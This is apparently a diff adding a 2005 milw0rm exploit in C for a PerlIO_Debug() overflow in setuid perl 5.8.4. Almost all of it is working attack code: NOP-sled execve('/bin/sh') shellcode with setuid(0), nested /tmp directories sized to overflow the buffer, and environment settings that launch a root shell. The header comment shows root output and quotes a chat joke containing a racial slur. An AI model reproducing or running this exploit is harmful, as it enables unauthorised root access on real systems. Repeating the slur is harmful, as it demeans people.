@@ -1,0 +1,143 @@
+/*
+ * Copyright Kevin Finisterre
+ *
+ * Setuid perl PerlIO_Debug() overflow
+ *
+ * Tested on Debian 3.1 perl-suid 5.8.4-5 
+ *
+ * (11:07:20) *corezion:* who is tha man with tha masta plan?
+ * (11:07:36) *corezion:* a nigga with a buffer overrun
+ * (11:07:39) *corezion:* heh
+ * (of course that is to the tune of http://www.azlyrics.com/lyrics/drdre/niggawittagun.html)
+ *
+ * cc -o ex_perl2 ex_perl2.c -std=c99
+ * 
+ * kfinisterre@jdam:~$ ./ex_perl2
+ * Dirlen: 1052
+ * Charlie Murphy!!!@#@
+ * sh-2.05b# id
+ * uid=1000(kfinisterre) gid=1000(kfinisterre) euid=0(root) 
+ * 
+ */
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <strings.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main(int *argc, char **argv)
+{
+	int len = 23;
+ 	int count = 5;
+	char malpath[10000];
+	char tmp[256];
+	char *filler;
+	char *ptr;
+
+	unsigned char code[] = 
+	/*
+	  0xff-less execve() /bin/sh by anathema <anathema@hack.co.za>
+	  Linux/IA32 0xff-less execve() shellcode.  
+	 */
+        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+
+        // setuid(0) - fix for redhat based machines
+	"\x31\xdb"                      // xorl         %ebx,%ebx
+	"\x8d\x43\x17"                  // leal         0x17(%ebx),%eax
+	"\xcd\x80"                      // int          $0x80
+
+	"\x89\xe6"                          /* movl %esp, %esi          */
+	"\x83\xc6\x30"                      /* addl $0x30, %esi         */
+	"\xb8\x2e\x62\x69\x6e"              /* movl $0x6e69622e, %eax   */
+	"\x40"                              /* incl %eax                */
+	"\x89\x06"                          /* movl %eax, (%esi)        */
+	"\xb8\x2e\x73\x68\x21"              /* movl $0x2168732e, %eax   */
+	"\x40"                              /* incl %eax                */
+	"\x89\x46\x04"                      /* movl %eax, 0x04(%esi)    */
+	"\x29\xc0"                          /* subl %eax, %eax          */
+	"\x88\x46\x07"                      /* movb %al, 0x07(%esi)     */
+	"\x89\x76\x08"                      /* movl %esi, 0x08(%esi)    */
+	"\x89\x46\x0c"                      /* movl %eax, 0x0c(%esi)    */
+	"\xb0\x0b"                          /* movb $0x0b, %al          */
+	"\x87\xf3"                          /* xchgl %esi, %ebx         */
+	"\x8d\x4b\x08"                      /* leal 0x08(%ebx), %ecx    */
+	"\x8d\x53\x0c"                      /* leal 0x0c(%ebx), %edx    */
+	"\xcd\x80"                          /* int $0x80                */;
+
+
+	chdir("/tmp/");
+
+	// do one less char than usual for RedHat 
+	filler = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/";
+	
+	for (int x=0; x<4; x=x+1)
+	{
+		mkdir(filler, 0777);
+		chdir(filler);
+		// do one less char than usual for RedHat 
+		count = count + 255;		
+	}
+
+        memset(tmp,0x41,len);  
+	count = count + len;
+
+        ptr = tmp+len;
+        ptr = putLong (ptr, 0xbffffb6a); // frame 11 ebp
+        ptr = putLong (ptr, 0xbffffb6a); 
+        ptr = putLong (ptr, 0xbffffb6a);
+
+	strcat(tmp, "/");
+	mkdir(tmp, 0777);
+	chdir(tmp);
+
+	printf ("Dirlen: %d\n", count); 
+
+	FILE *perlsploit;
+	char perldummyfile[] = {
+                "#!/usr/bin/sperl5.8.4\n"
+                "# \n"
+                "# Be proud that perl(1) may proclaim: \n"
+                "#   Setuid Perl scripts are safer than C programs ...\n"
+                "# Do not abandon (deprecate) suidperl. Do not advocate C wrappers. \n"
+        };
+
+        if(!(perlsploit = fopen("take_me.pl","w+"))) {
+                printf("error opening file\n");
+                exit(1);
+        }
+        fwrite(perldummyfile,sizeof(perldummyfile)-1,1,perlsploit);
+        fclose(perlsploit);
+
+	getcwd(malpath, 10000);
+	strcat(malpath, "/");
+	strcat(malpath, "take_me.pl");
+	printf("Charlie Murphy!!!@#@\n");
+
+	chmod(malpath,0755);
+        setenv("PERLIO_DEBUG", "/tmp/ninjitsu", 1);
+	setenv("PERL5LIB", code, 1);
+	execv(malpath,(char *) NULL);
+
+}
+/*
+ * put a address in mem, for little-endian
+ *
+ */
+char*
+putLong (char* ptr, long value)
+{
+    *ptr++ = (char) (value >> 0) & 0xff;
+    *ptr++ = (char) (value >> 8) & 0xff;
+    *ptr++ = (char) (value >> 16) & 0xff;
+    *ptr++ = (char) (value >> 24) & 0xff;
+
+    return ptr;
+}
+
+// milw0rm.com [2005-02-07]
